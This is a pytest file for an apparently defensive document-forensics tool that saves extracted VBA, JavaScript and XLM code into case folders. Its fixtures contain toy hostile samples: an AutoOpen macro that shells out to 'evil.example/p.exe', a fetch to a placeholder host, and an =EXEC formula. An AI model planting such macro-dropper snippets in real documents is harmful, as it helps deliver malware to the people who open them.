"""Tests for dumping extracted code (VBA/JS/XLM) to files in the case."""

from __future__ import annotations

from docutracex import codefiles
from docutracex.storage import CasePaths


def _case(tmp_path):
    cp = CasePaths("case1", cases_dir=tmp_path)
    cp.root.mkdir(parents=True, exist_ok=True)
    return cp


def test_annotate_dumps_vba_js_xlm(tmp_path) -> None:
    cp = _case(tmp_path)
    modules = {
        "oletools": {"code_text": 'Sub AutoOpen()\n  Shell "http://evil.example/p.exe"\nEnd Sub\n'},
        "javascript": {"scripts": [
            {"location": "body:script#1", "kind": "html", "code": "fetch('http://x.example')"},
            {"kind": "pdf", "code": "app.alert(1)"},
        ]},
        "xlmdeobf": {"code_text": '=EXEC("calc")'},
        "word": {"text_sample": "no code here"},
    }
    changed = codefiles.annotate(modules, cp)

    assert changed == {"oletools", "javascript", "xlmdeobf"}  # word has no code
    vba = modules["oletools"]["code_file"]
    assert vba == "extracted/code/vba/vba_macros.vba"
    assert (cp.root / vba).read_text().startswith("Sub AutoOpen()")
    for sc in modules["javascript"]["scripts"]:
        assert sc["code_file"].startswith("extracted/code/js/")
        assert (cp.root / sc["code_file"]).is_file()
    assert (cp.root / modules["xlmdeobf"]["code_file"]).read_text() == '=EXEC("calc")'


def test_annotate_is_idempotent(tmp_path) -> None:
    cp = _case(tmp_path)
    modules = {"oletools": {"code_text": "Sub X()\nEnd Sub"}}
    first = codefiles.annotate(modules, cp)
    assert first == {"oletools"}
    # Second pass: file unchanged, nothing reported as changed.
    assert codefiles.annotate(modules, cp) == set()


def test_annotate_skips_empty_code(tmp_path) -> None:
    cp = _case(tmp_path)
    modules = {"oletools": {"code_text": "   "}, "xlmdeobf": {"code_text": ""}}
    assert codefiles.annotate(modules, cp) == set()
    assert "code_file" not in modules["oletools"]


def test_full_code_dumped_even_when_display_truncated(tmp_path) -> None:
    # The parsers stash the complete source in _full_code; the display field
    # (code / code_text) may be truncated. The dumped file must be the FULL
    # source, and _full_code must not survive in the persisted dict.
    cp = _case(tmp_path)
    full_js = "A" * 90000  # > the 60k the UI keeps
    modules = {
        "javascript": {"scripts": [
            {"kind": "html", "code": "A" * 60000, "code_truncated": True, "_full_code": full_js},
        ]},
        "oletools": {"code_text": "short display",
                     "tools": {"olevba": {"_full_code": "Sub Full()\n" + "x" * 500000 + "\nEnd Sub"}}},
        "xlmdeobf": {"code_text": "=A()", "_full_code": "=A()\n=B()\n=C()"},
    }
    codefiles.annotate(modules, cp)

    js_file = cp.root / modules["javascript"]["scripts"][0]["code_file"]
    assert js_file.read_text() == full_js  # complete, not the 60k display copy
    vba_file = cp.root / modules["oletools"]["code_file"]
    assert vba_file.read_text().startswith("Sub Full()") and len(vba_file.read_text()) > 400000
    assert (cp.root / modules["xlmdeobf"]["code_file"]).read_text() == "=A()\n=B()\n=C()"

    # Scratch key removed from every dict (never persisted / sent to the UI).
    assert "_full_code" not in modules["javascript"]["scripts"][0]
    assert "_full_code" not in modules["oletools"]["tools"]["olevba"]
    assert "_full_code" not in modules["xlmdeobf"]


def test_dumped_path_is_not_mined_as_ioc(tmp_path) -> None:
    from docutracex import ioc
    cp = _case(tmp_path)
    modules = {"oletools": {"code_text": "Sub X()\nEnd Sub"}}
    codefiles.annotate(modules, cp)  # adds code_file = extracted/code/vba/...
    iocs = ioc.extract(ioc.sources_from_modules(modules))["iocs"]
    assert not any("extracted/code" in i["value"] for i in iocs)
